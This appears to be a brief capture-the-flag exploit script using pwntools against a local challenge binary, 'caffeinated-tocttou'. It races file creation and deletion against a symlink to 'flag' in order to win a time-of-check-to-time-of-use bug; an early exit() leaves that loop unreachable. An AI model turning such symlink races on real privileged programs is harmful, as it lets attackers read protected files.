#!/usr/bin/env python

from pwn import *
import os

p = process("./caffeinated-tocttou")

p.sendline("b")

p.recv()

exit()

while True:
    with open("abc", "w") as f:
        pass
    os.remove("abc")
    os.symlink("flag", "abc")

p.interactive()
"""
while True:
    with open("a", "w"):
        pass
    os.unlink("a")
    os.symlink("flag", "a")
"""
